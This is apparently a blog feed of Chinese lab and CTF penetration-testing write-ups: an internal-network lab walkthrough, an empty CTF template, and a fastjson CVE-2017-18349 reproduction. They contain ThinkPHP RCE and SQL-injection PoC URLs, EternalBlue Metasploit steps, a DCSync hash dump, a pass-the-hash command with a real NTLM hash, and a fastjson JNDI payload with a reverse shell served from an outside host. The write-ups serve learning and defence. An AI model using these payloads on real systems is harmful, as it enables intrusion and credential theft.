class="hljs-name">html</span>&gt;</span><br>&#123;&#123;end&#125;&#125;<br></code></pre></td></tr></table></figure><p>11、将改写后的html上传实现查询flag</p><p><img src="/img/image-20250629021124184.png" alt="查询flag8"></p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">flag<span class="hljs-number">8</span>&#123;b<span class="hljs-number">2550207</span><span class="hljs-keyword">c</span><span class="hljs-number">96735</span>d<span class="hljs-number">0750</span>be<span class="hljs-number">3</span>bbd<span class="hljs-number">00</span>cfc<span class="hljs-number">4</span><span class="hljs-keyword">c</span>&#125;<br></code></pre></td></tr></table></figure><h5 id="flag9"><a href="#flag9" class="headerlink" title="flag9"></a><span style="color:blue">flag9</span></h5><p>1、访问10.3.3.110，通过搜索引擎查询发现该页面存在目录穿越</p><p><img src="/img/image-20250629021446614.png" alt="目录穿越漏洞"></p><p>2、我们用hackbar构造poc实现目录穿越最终成功拿到flag9</p><p><img src="/img/image-20250629021631239.png" alt="构造目录穿越POC"></p><p><img src="/img/image-20250629021752316.png" alt="获取flag9"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag9</span>&#123;<span class="hljs-number">44</span>cf2f30b206e72e6e397bd221d26469&#125;<br></code></pre></td></tr></table></figure><h5 id="flag10"><a href="#flag10" class="headerlink" title="flag10"></a><span style="color:blue">flag10</span></h5><p>1、根据靶机开放在22端口这个信息我们实现ssh远程登录</p><p><img src="/img/image-20250629022027537.png" alt="SSH远程登录"></p><p>其中密码就是数据库中查询到的<strong>Aa123456</strong></p><p>2、采用命令行cat &#x2F;flag拿到flag</p><p><img src="/img/image-20250629022213059.png" alt="获取flag10"></p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">flag10</span><span class="hljs-template-variable">&#123;f5ccc6e87da77fbc0530a674ab627bb8&#125;</span><br></code></pre></td></tr></table></figure><h5 id="flag11"><a href="#flag11" class="headerlink" title="flag11"></a><span style="color:blue">flag11</span></h5><p>我们通过执行10.3.3.120用户目录下的ipsec_connect即可拿到flag11</p><p><img src="/img/image-20250629022455868.png" alt="获取flag11"></p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">flag<span class="hljs-number">11</span>&#123;<span class="hljs-number">526</span><span class="hljs-keyword">c</span><span class="hljs-number">7</span>fe<span class="hljs-number">7632</span><span class="hljs-keyword">c</span><span class="hljs-number">1</span>aced<span class="hljs-number">8</span>f<span class="hljs-number">844</span>f<span class="hljs-number">6</span>f<span class="hljs-number">498</span><span class="hljs-keyword">c</span><span class="hljs-number">63</span>a&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Web渗透</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内网渗透</tag>
      
      <tag>多网段攻击</tag>
      
      <tag>横向移动</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>内网渗透--春秋云镜initial</title>
    <link href="/2025/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F--%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Cinitial/"/>
    <url>/2025/03/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F--%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9Cinitial/</url>
    
    <content type="html"><![CDATA[<h1 id="内网渗透–春秋云镜initial"><a href="#内网渗透–春秋云镜initial" class="headerlink" title="内网渗透–春秋云镜initial"></a>内网渗透–春秋云镜initial</h1><h2 id="一，前置知识"><a href="#一，前置知识" class="headerlink" title="一，前置知识"></a>一，前置知识</h2><h3 id="前置知识包括三个部分thinkphp-内网穿透，永恒之蓝"><a href="#前置知识包括三个部分thinkphp-内网穿透，永恒之蓝" class="headerlink" title="前置知识包括三个部分thinkphp,内网穿透，永恒之蓝"></a>前置知识包括三个部分thinkphp,内网穿透，永恒之蓝</h3><h4 id="1-thinkphp漏洞原理"><a href="#1-thinkphp漏洞原理" class="headerlink" title="1.thinkphp漏洞原理"></a>1.thinkphp漏洞原理</h4><h5 id="thinkphp-2-x"><a href="#thinkphp-2-x" class="headerlink" title="thinkphp 2.x"></a>thinkphp 2.x</h5><p>ThinkPHP 2.x 远程代码执行漏洞（CVE-2014-9784）的原理主要涉及框架对用户输入的动态路由处理机制未进行严格过滤，导致攻击者可通过构造特定 URL 执行任意 PHP 代码</p><p>使用<code>preg_replace</code>的<code>/e</code>模式匹配路由：</p><p><code>$res = preg_replace(&#39;@(\w+)&#39;.$depr.&#39;([^&#39;.$depr.&#39;\/]+)@e&#39;, &#39;$var[\&#39;\\1\&#39;]=&quot;\\2&quot;;&#39;, implode($depr,$paths));</code></p><p>导致用户的输入参数被插入双引号中执行，造成任意代码执行漏洞。</p><p>例如执行的poc url:</p><p><code>http://ip:8080//index.php? s=/index/index/xxx/$&#123;system(id)&#125;</code></p><h5 id="ThinkPHP5-SQL注入漏洞-敏感信息泄露"><a href="#ThinkPHP5-SQL注入漏洞-敏感信息泄露" class="headerlink" title="ThinkPHP5 SQL注入漏洞 &amp;&amp; 敏感信息泄露"></a>ThinkPHP5 SQL注入漏洞 &amp;&amp; 敏感信息泄露</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">app</span>\<span class="hljs-title class_">index</span>\<span class="hljs-title class_">controller</span>;<br><br><span class="hljs-keyword">use</span> <span class="hljs-title">app</span>\<span class="hljs-title">index</span>\<span class="hljs-title">model</span>\<span class="hljs-title">User</span>;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Index</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">index</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$ids</span> = <span class="hljs-title function_ invoke__">input</span>(<span class="hljs-string">&#x27;ids/a&#x27;</span>);<br>        <span class="hljs-variable">$t</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>();<br>        <span class="hljs-variable">$result</span> = <span class="hljs-variable">$t</span>-&gt;<span class="hljs-title function_ invoke__">where</span>(<span class="hljs-string">&#x27;id&#x27;</span>, <span class="hljs-string">&#x27;in&#x27;</span>, <span class="hljs-variable">$ids</span>)-&gt;<span class="hljs-title function_ invoke__">select</span>();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>代码使用 <code>input(&#39;ids/a&#39;)</code> 来接收用户输入，此方式未对输入进行严格过滤与验证，攻击者可能会通过构造恶意输入实施 SQL 注入攻击。比如，攻击者可传入包含恶意 SQL 语句的 <code>ids</code> 参数，借此绕过正常的查询逻辑。</p><p>例如： <code>http://192.168.18.181/index.php?ids[0,updatexml(0,concat(0xa,user()),0)]=1</code></p><p> 数组的键名（<code>0,updatexml(...)</code>）被直接拼接到 SQL 查询中，导致 SQL 注入。</p><p>即<code>SELECT * FROM user WHERE id IN (0,updatexml(0,concat(0xa,user()),0))</code></p><h5 id="ThinkPHP-5-0-23-远程代码执行漏洞"><a href="#ThinkPHP-5-0-23-远程代码执行漏洞" class="headerlink" title="ThinkPHP 5.0.23 远程代码执行漏洞"></a>ThinkPHP 5.0.23 远程代码执行漏洞</h5><p>其5.0.23以前的版本中，获取method的方法中没有正确处理方法名，导致攻击者可以调用Request类任意方法并构造利用链，从而导致远程代码执行漏洞。</p><p>poc url:</p><p><code>http://example.com/index.php?s=captcha&amp;method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=id</code></p><h4 id="2，内网穿透"><a href="#2，内网穿透" class="headerlink" title="2，内网穿透"></a>2，内网穿透</h4><h5 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h5><p>攻击外网服务器，获取外网服务器的权限，接着利用入侵成功的外网服务器作为跳板，攻击内网其他服务器，最后获得敏感数据，并将数据传递到攻击者，看情况安装长期后门，实现长期控制和获得敏感数据的方式</p><h5 id="攻击方法"><a href="#攻击方法" class="headerlink" title="攻击方法"></a>攻击方法</h5><p><strong>frp中转代理</strong></p><p><strong>服务端（frps）</strong>：部署在公网服务器，监听指定端口，负责接收外部请求并转发到内网。</p><p><strong>客户端（frpc）</strong>：运行在内网设备，与服务端建立长连接，将内网服务映射到公网。</p><p><strong>Neo-reGeorg</strong>脚本监听</p><p><strong>服务端</strong>：部署在目标服务器的 Webshell 脚本（如<code>tunnel.php</code>、<code>tunnel.jsp</code>），负责接收 HTTP 请求并转发到内网目标。</p><p><strong>客户端</strong>：攻击机上运行的 Python 脚本（如<code>reGeorgSocksProxy.py</code>），监听本地端口并将 SOCKS 请求通过 HTTP 协议发送到服务端。</p><h4 id="3-横向移动与域渗透"><a href="#3-横向移动与域渗透" class="headerlink" title="3.横向移动与域渗透"></a>3.横向移动与域渗透</h4><p><strong>横向移动</strong>：在内网中从已控制的主机向其他未授权主机扩展权限的过程，核心目标是获取更多资源访问权限。</p><p>通常采用哈希传递的方法是实现横向移动：</p><p>在 Windows 系统中，用户密码通常以哈希值的形式存储，而攻击者可以直接传递这个哈希值来完成认证，绕过传统的口令验证。</p><p>哈希传递（PTH）：使用<code>crackmapexec</code>结合 NTLM 哈希远程执行命令。</p><p><strong>域渗透</strong>：针对 Windows 域环境的攻击，目标是控制域控制器（DC）并获取域内所有资源权限。</p><p>域控攻击</p><ul><li><p><strong>DCSync 攻击</strong>：利用 Mimikatz 导出域内用户哈希。</p></li><li><p><strong>黄金票据（Golden Ticket）</strong>：伪造 Kerberos TGT 票据，长期控制域。</p></li></ul><h2 id="二，复现过程"><a href="#二，复现过程" class="headerlink" title="二，复现过程"></a>二，复现过程</h2><p>利用集成攻击工具然后getshell</p><p>连接蚁剑终端，查看权限</p><p><img src="/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-03-18%20205826.png" alt="蚁剑终端权限"></p><p>注意到&#x2F;usr&#x2F;bin&#x2F;mysql有root权限，我们可以采用mysql提权</p><p><code>sudo mysql -e &#39;\! cat /root/flag/f*&#39;</code></p><p><img src="/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-03-18%20205817.png" alt="MySQL提权"></p><p>成功夺取flag01</p><p>随后进行信息收集，先用ifconfig查看内网IP</p><p><img src="https://fushuling-1309926051.cos.ap-shanghai.myqcloud.com/2023/08/5.png" alt="内网IP信息"></p><p>上传fscan_amd扫描内网环境</p><p><img src="/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-03-18%20210116.png" alt="扫描内网环境"></p><p>注意到内网中有三个ip:172.22.1.21存在永恒之蓝  172.22.1.18信呼系统  172.22.1.2   DC域控</p><p><strong>DC权限最高，在最后夺取域控的时候打，先打信呼</strong></p><h3 id="2，内网渗透"><a href="#2，内网渗透" class="headerlink" title="2，内网渗透"></a>2，内网渗透</h3><p>利用工具neo-regeorgs生成脚本并上传</p><p><code>python3 nenreg.py generate -k kali</code></p><p><img src="/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-03-18%20210400.png" alt="生成脚本并上传"></p><p>设置socks5代理监听1080端口</p><p><code>python neoreg.py -k password -u http://39.98.171.149/tunnel.php</code></p><p><img src="/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-03-18%20210643.png" alt="设置socks5代理"></p><p>在proxychains4设置socks5代理</p><p><img src="/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-03-18%20211858.png" alt="设置socks5代理"></p><p>测试连接</p><p><img src="/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-03-18%20212117.png" alt="测试连接"></p><p>连接成功</p><p>随后利用现成的poc打信呼，同时在同目录下放置一句话木马</p><p><img src="/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-03-18%20212946.png" alt="利用poc打信呼"></p><p>通过回显的url连接蚁剑夺取flag02</p><p><img src="/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-03-18%20213328.png" alt="夺取flag02"></p><h3 id="3-横向移动与域渗透-1"><a href="#3-横向移动与域渗透-1" class="headerlink" title="3.横向移动与域渗透"></a>3.横向移动与域渗透</h3><p>先打利用msf打永恒之蓝</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">use exploit/windows/smb/ms17_010_eternalblue<br><span class="hljs-built_in">set</span> payload windows/x64/meterpreter/bind_tcp<br>show options <br><span class="hljs-built_in">set</span> rhosts 172.22.1.21<br>run<br></code></pre></td></tr></table></figure><p><img src="/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-03-18%20213439.png" alt="打永恒之蓝"></p><p>开始横向，导出域控hash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">load kiwi<br>kiwi_cmd lsadump::dcsync /domain:xiaorang.lab /all /csv<br></code></pre></td></tr></table></figure><p><img src="/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-03-18%20213654.png" alt="导出域控hash"></p><p>我们得到了最高权限密码</p><p>最后打hash传递</p><p><code>proxychains crackmapexec smb 172.22.1.2 -u administrator -H10cf89a850fb1cdbe6bb432b859164c8 -d xiaorang.lab -x &quot;type Users\Administrator\flag\flag03.txt&quot;</code></p><p><img src="/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-03-18%20214129.png" alt="打hash传递"></p><p>用NTLM 哈希值以该用户身份登录系统，然后夺取整个域控，在主机中拿下flag</p>]]></content>
    
    
    <categories>
      
      <category>Web渗透</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内网渗透</tag>
      
      <tag>横向移动</tag>
      
      <tag>域渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CTF题目解析：【题目名称】</title>
    <link href="/2023/10/18/CTF%E7%AB%9E%E8%B5%9B%E6%A8%A1%E6%9D%BF/"/>
    <url>/2023/10/18/CTF%E7%AB%9E%E8%B5%9B%E6%A8%A1%E6%9D%BF/</url>
    
    <content type="html"><![CDATA[<h2 id="🚩-题目信息"><a href="#🚩-题目信息" class="headerlink" title="🚩 题目信息"></a>🚩 题目信息</h2><table><thead><tr><th>项目</th><th>详情</th></tr></thead><tbody><tr><td>比赛名称</td><td>XXXX CTF 2023</td></tr><tr><td>题目类型</td><td>Web&#x2F;Crypto&#x2F;Pwn&#x2F;Reverse&#x2F;Misc</td></tr><tr><td>难度级别</td><td>简单&#x2F;中等&#x2F;困难</td></tr><tr><td>分值</td><td>XXX</td></tr></tbody></table><span id="more"></span><h2 id="📝-题目描述"><a href="#📝-题目描述" class="headerlink" title="📝 题目描述"></a>📝 题目描述</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">这里是原始题目描述<br></code></pre></td></tr></table></figure><h3 id="题目附件"><a href="#题目附件" class="headerlink" title="题目附件"></a>题目附件</h3><ul><li>附件1：<a href="">下载链接</a></li><li>附件2：<a href="">下载链接</a></li></ul><h2 id="🔍-解题思路"><a href="#🔍-解题思路" class="headerlink" title="🔍 解题思路"></a>🔍 解题思路</h2><h3 id="初步分析"><a href="#初步分析" class="headerlink" title="初步分析"></a>初步分析</h3><p>描述看到题目后的初步分析和思路。</p><h3 id="关键突破点"><a href="#关键突破点" class="headerlink" title="关键突破点"></a>关键突破点</h3><p>分析解题的关键点和突破口。</p><h3 id="解题路径"><a href="#解题路径" class="headerlink" title="解题路径"></a>解题路径</h3><p>详细描述从题目到获取flag的完整思路。</p><h2 id="💻-解题过程"><a href="#💻-解题过程" class="headerlink" title="💻 解题过程"></a>💻 解题过程</h2><h3 id="第一步：信息收集"><a href="#第一步：信息收集" class="headerlink" title="第一步：信息收集"></a>第一步：信息收集</h3><p>详细说明第一步的操作和发现。</p><h3 id="第二步：漏洞分析"><a href="#第二步：漏洞分析" class="headerlink" title="第二步：漏洞分析"></a>第二步：漏洞分析</h3><p>分析题目中的漏洞或切入点。</p><h3 id="第三步：漏洞利用"><a href="#第三步：漏洞利用" class="headerlink" title="第三步：漏洞利用"></a>第三步：漏洞利用</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 解题代码</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">solve_challenge</span>():<br>    <span class="hljs-comment"># 代码实现</span><br>    flag = <span class="hljs-string">&quot;获取flag的过程&quot;</span><br>    <span class="hljs-keyword">return</span> flag<br><br><span class="hljs-built_in">print</span>(solve_challenge())<br></code></pre></td></tr></table></figure><h3 id="第四步：获取Flag"><a href="#第四步：获取Flag" class="headerlink" title="第四步：获取Flag"></a>第四步：获取Flag</h3><figure class="highlight ceylon"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ceylon">flag&#123;<span class="hljs-keyword">this</span><span class="hljs-number">_</span><span class="hljs-keyword">is</span><span class="hljs-number">_</span>a<span class="hljs-number">_</span>sample<span class="hljs-number">_f</span>lag&#125;<br></code></pre></td></tr></table></figure><h2 id="📚-相关知识点"><a href="#📚-相关知识点" class="headerlink" title="📚 相关知识点"></a>📚 相关知识点</h2><h3 id="知识点1"><a href="#知识点1" class="headerlink" title="知识点1"></a>知识点1</h3><p>详细解释解题过程中涉及的第一个知识点。</p><h3 id="知识点2"><a href="#知识点2" class="headerlink" title="知识点2"></a>知识点2</h3><p>详细解释解题过程中涉及的第二个知识点。</p><h3 id="知识点3"><a href="#知识点3" class="headerlink" title="知识点3"></a>知识点3</h3><p>详细解释解题过程中涉及的第三个知识点。</p><h2 id="🔧-工具使用"><a href="#🔧-工具使用" class="headerlink" title="🔧 工具使用"></a>🔧 工具使用</h2><ul><li>工具1：用途及使用方法</li><li>工具2：用途及使用方法</li></ul><h2 id="💡-解题心得"><a href="#💡-解题心得" class="headerlink" title="💡 解题心得"></a>💡 解题心得</h2><p>分享解题过程中的心得体会、遇到的困难和解决方法。</p><h2 id="📌-相关题目推荐"><a href="#📌-相关题目推荐" class="headerlink" title="📌 相关题目推荐"></a>📌 相关题目推荐</h2><ul><li>相关题目1：简要描述</li><li>相关题目2：简要描述</li></ul><h2 id="🏆-总结"><a href="#🏆-总结" class="headerlink" title="🏆 总结"></a>🏆 总结</h2><p>总结这道题的价值和学习到的技能。</p>]]></content>
    
    
    <categories>
      
      <category>CTF竞赛</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>WriteUp</tag>
      
      <tag>解题思路</tag>
      
      <tag>技能提升</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>fastjson 1.2.24 反序列化 RCE 漏洞复现(CVE-2017-18349)</title>
    <link href="/2023/10/18/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-RCE-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <url>/2023/10/18/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-RCE-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h2 id="📢-漏洞概述"><a href="#📢-漏洞概述" class="headerlink" title="📢 漏洞概述"></a>📢 漏洞概述</h2><h4 id="漏洞背景："><a href="#漏洞背景：" class="headerlink" title="漏洞背景："></a>漏洞背景：</h4><p>1.fastjson 是阿里巴巴开发的一款高性能 JSON 解析库，在 Java 开发领域被广泛应用，用于处理 JSON 数据的序列化与反序列化操作，众多企业级应用借助它实现高效的数据交互与处理。</p><p>2.Java 反序列化机制是 Java 提供的一种将字节流重新转换为 Java 对象的功能，在分布式系统、远程通信等场景中常用，但该机制存在被恶意利用的风险。</p><p>3.当 fastjson 在反序列化过程中对输入数据的校验和控制不足时，攻击者可构造特殊的 JSON 数据，利用 Java 反序列化机制执行任意代码，从而严重威胁应用系统安全。</p><h4 id="漏洞触发条件："><a href="#漏洞触发条件：" class="headerlink" title="漏洞触发条件："></a><em>漏洞触发条件：</em></h4><p>1.fastjson 的 autoType 功能默认开启，该功能允许在反序列化时根据 JSON 数据中的 @type 字段来确定要反序列化的具体 Java 类。此功能虽提供了便利，但也为攻击者创造了可乘之机。</p><p>2.攻击者构造包含特定恶意类（如具有 JNDI 注入能力的类）的 JSON 数据，利用 autoType 功能，使 fastjson 在反序列化过程中加载并实例化恶意类，进而触发远程代码执行漏洞。</p><h4 id="漏洞利用流程："><a href="#漏洞利用流程：" class="headerlink" title="漏洞利用流程："></a>漏洞利用流程：</h4><p>1.攻击者需要找到应用程序中使用 fastjson 进行 JSON 反序列化的接口端点，例如常见的接受 JSON 格式数据的 API 接口。</p><p>2.在 CVE - 2017 - 18349 漏洞利用中，攻击者利用 fastjson 对 @type 字段的解析特性，精心构造恶意 JSON 数据。</p><p>3.恶意类加载与执行：攻击者构造的 JSON 数据中指定的恶意类（如 com.sun.rowset.JdbcRowSetImpl）在反序列化过程中被加载，该类在初始化时会解析特定参数（如 dataSourceName），攻击者通过将该参数指向恶意的 LDAP 服务器，触发 JNDI 注入，最终实现远程代码执行。</p><p><img src="/%5Cimg%5Cwps1-1755424575710-1-1755424618927-3.jpg" alt="img"> </p><h2 id="🔎-漏洞详情"><a href="#🔎-漏洞详情" class="headerlink" title="🔎 漏洞详情"></a>🔎 漏洞详情</h2><h4 id="受影响的版本："><a href="#受影响的版本：" class="headerlink" title="受影响的版本："></a>受影响的版本：</h4><p>此漏洞影响 fastjson 1.2.24 及以下版本。只要应用中使用了这些版本的 fastjson 库进行 JSON 反序列化操作，并且 autoType 功能未被正确禁用，漏洞就可能被触发。<br>配置和部署条件：<br>仅在 fastjson 库的 autoType 功能开启，且应用未对反序列化类进行严格白名单限制的情况下，攻击者才能利用该漏洞。默认情况下，fastjson 的 autoType 功能是开启的，许多开发者在项目开发过程中如果没有关注到安全配置，就容易引入安全隐患。</p><h4 id="可能受影响的系统："><a href="#可能受影响的系统：" class="headerlink" title="可能受影响的系统："></a>可能受影响的系统：</h4><p>Java Web 应用： 广泛使用 fastjson 处理 JSON 数据交互的各类 Java Web 应用，包括电商平台、企业管理系统、在线办公系统等。<br>分布式系统： 以 Java 语言开发，采用分布式架构，在各节点间使用 fastjson 进行数据传输与解析的分布式系统。<br>微服务架构： 基于微服务架构搭建，服务间通信依赖 fastjson 进行 JSON 数据序列化与反序列化的应用体系。</p><h4 id="潜在风险与后果："><a href="#潜在风险与后果：" class="headerlink" title="潜在风险与后果："></a>潜在风险与后果：</h4><p>漏洞可导致远程代码执行，攻击者能够在受影响的服务器上执行任意 Java 代码，进而获取服务器敏感信息，如数据库连接信息、用户凭证等。<br>如果受影响的应用系统缺乏有效的边界防护与访问控制，攻击者可借助该漏洞实现横向移动，进一步渗透整个网络，造成大规模的数据泄露、服务瘫痪，甚至使企业关键业务系统完全被攻击者掌控 。</p><h4 id="评分"><a href="#评分" class="headerlink" title="评分"></a>评分</h4><p>CVE-2017-18349 漏洞的 CVSS v3.0 评分为 8.1，同样属于高风险漏洞。鉴于其能引发远程代码执行，一旦被利用，攻击者可肆意操控服务器，窃取敏感数据、破坏系统运行。尤其是当使用 fastjson 1.2.24 及以下版本的系统暴露在公共网络上时，遭受攻击的风险急剧攀升。强烈建议相关企业与开发者尽快按照修复建议进行处理，如升级 fastjson 至安全版本，或合理配置 autoType 关闭策略，降低安全隐患，保障系统平稳、安全运行 。</p><h3 id="漏洞存在条件"><a href="#漏洞存在条件" class="headerlink" title="漏洞存在条件"></a>漏洞存在条件</h3><p>fastjson 的 autoType 功能开启：fastjson 必须开启了 autoType 功能，默认情况下 fastjson 1.2.24 及以下版本该功能是开启的。当应用程序使用 fastjson 进行 JSON 反序列化时，这个功能允许根据 JSON 数据中的 @type 字段来确定要反序列化的具体 Java 类，从而为漏洞利用创造了条件。</p><p>反序列化类未受严格限制：应用程序在使用 fastjson 进行反序列化操作时，没有对反序列化的类进行严格的白名单限制。这使得攻击者能够构造包含恶意类（如具有 JNDI 注入能力的类，如 com.sun.rowset.JdbcRowSetImpl 等）的 JSON 数据，在反序列化过程中加载并实例化这些恶意类。</p><p>使用的 fastjson 版本：漏洞存在于 fastjson 1.2.24 及以下版本中。如果应用程序没有及时将 fastjson 库升级到安全版本（1.2.25 及以上），就容易受到该反序列化 RCE 漏洞的影响。</p><h2 id="🧪-漏洞复现"><a href="#🧪-漏洞复现" class="headerlink" title="🧪 漏洞复现"></a>🧪 漏洞复现</h2><h6 id="1-拉取CVE-2019-17558复现环境"><a href="#1-拉取CVE-2019-17558复现环境" class="headerlink" title="1.拉取CVE-2019-17558复现环境"></a>1.拉取CVE-2019-17558复现环境</h6><p>在靶机对应的漏洞文件夹下运行docker compose up</p><p>运行docker ps可查看容器运行情况</p><p><img src="/img/wps2.jpg" alt="img"> </p><p>由图可知，容器成功运行在本机8090端口</p><p><strong>2.编译反弹shell代码</strong></p><p>在本地写一个test.java</p><p><img src="/img/wps3.jpg" alt="img"> </p><p>将shell反弹到本机4563端口</p><p>在Java8环境中编译test.java并上传到服务器</p><p><img src="/img/wps4.jpg" alt="img"> </p><p>随后开启http服务，将爆破代码上传****pyton -m http.server 5623****</p><p><img src="/img/wps5.jpg" alt="img"> </p><p>访问端口发现其成功运行</p><p><img src="/img/wps6.jpg" alt="img"> </p><p><strong>3.部署rmi服务</strong></p><p>在github上获取****marshalsec-0.0.3–SHOT-all.jar****</p><p>链接为<a href="https://github.com/RandomRobbieBF/marshalsec-jar">https://github.com/RandomRobbieBF/marshalsec-jar</a></p><p>运行以下命令</p><p>java -cp marshalsec-0.0.3–SHOT-all.jar marshalsec.jndi.RMIRefServer “<a href="http://47.96.99.165:5623/#test">http://47.96.99。165:5623/#test</a>“ 8653</p><p><img src="/img/wps7.jpg" alt="img"> </p><ol start="4"><li><strong>构造playload进行攻击</strong></li></ol><p><img src="/img/wps8.jpg" alt="img"> </p><p>观察端口回显</p><p><img src="/img/wps9.jpg" alt="img"> </p><p>发现5623端口目录被访问</p><p><img src="/img/wps10.jpg" alt="img"> </p><p>8653端口的rmi服务启动并被执行</p><p><img src="/img/wps11.jpg" alt="img"> </p><p>监听的4563端口成功反弹shell</p><h3 id="数据分析"><a href="#数据分析" class="headerlink" title="数据分析"></a>数据分析</h3><p>流量分析</p><p><img src="/img/image-20250817175049808.png" alt="image-20250817175049808"></p><h6 id="特殊的-JSON-数据格式："><a href="#特殊的-JSON-数据格式：" class="headerlink" title="特殊的 JSON 数据格式："></a>特殊的 JSON 数据格式：</h6><p>流量包中会包含精心构造的 JSON 数据，这些数据通常包含 @type 字段，用于指定要反序列化的类。例如：”@type”:”com.sun.rowset.JdbcRowSetImpl”,<br>          “dataSourceName”:”rmi:&#x2F;&#x2F;192.168.0.1:8653&#x2F;test”,<br>          “autoCommit”:true</p><h6 id="JNDI-相关的请求："><a href="#JNDI-相关的请求：" class="headerlink" title="JNDI 相关的请求："></a>JNDI 相关的请求：</h6><p>由于漏洞利用常借助 JNDI（Java 命名和目录接口）注入来实现远程代码执行，流量包中会出现与 JNDI 相关的请求。比如，会有向恶意 LDAP 服务器（如数据中 dataSourceName 指定的地址）发起的请求，以获取恶意类或资源。这些请求的目标地址通常是攻击者控制的服务器，并且请求的协议为 LDAP 协议（端口一般为 389 或攻击者自定义的端口，如 1389 等）。</p><h6 id="异常的请求头和内容类型："><a href="#异常的请求头和内容类型：" class="headerlink" title="异常的请求头和内容类型："></a>异常的请求头和内容类型：</h6><p>一般来说，使用 fastjson 进行数据交互的请求会有特定的请求头，比如 Content-Type: application&#x2F;json。但在攻击过程中，除了正常的 JSON 数据传输特征外，由于恶意构造的存在，请求的内容可能会包含一些不常见或不符合正常业务逻辑的字段和值。</p><h6 id="频繁的请求模式："><a href="#频繁的请求模式：" class="headerlink" title="频繁的请求模式："></a>频繁的请求模式：</h6><p>攻击者在尝试利用漏洞时，可能会发送多个不同的请求来测试和验证漏洞是否存在，或者进行一系列的操作来完成整个攻击流程。因此，流量包中可能会出现相对频繁且具有一定规律的请求模式，与正常的业务请求模式不同。</p><h6 id="数据传输量异常："><a href="#数据传输量异常：" class="headerlink" title="数据传输量异常："></a>数据传输量异常：</h6><p>与正常业务数据传输相比，包含恶意 JSON 数据的流量包可能会在数据量上表现出异常。因为恶意构造的数据可能包含较长的类名、复杂的参数值（如恶意的 dataSourceName 地址）等，导致传输的数据量比正常情况大。</p><h6 id="请求来源异常："><a href="#请求来源异常：" class="headerlink" title="请求来源异常："></a>请求来源异常：</h6><p>如果应用系统有固定的访问来源或正常的业务访问模式，而攻击流量的来源可能来自一些不常见的 IP 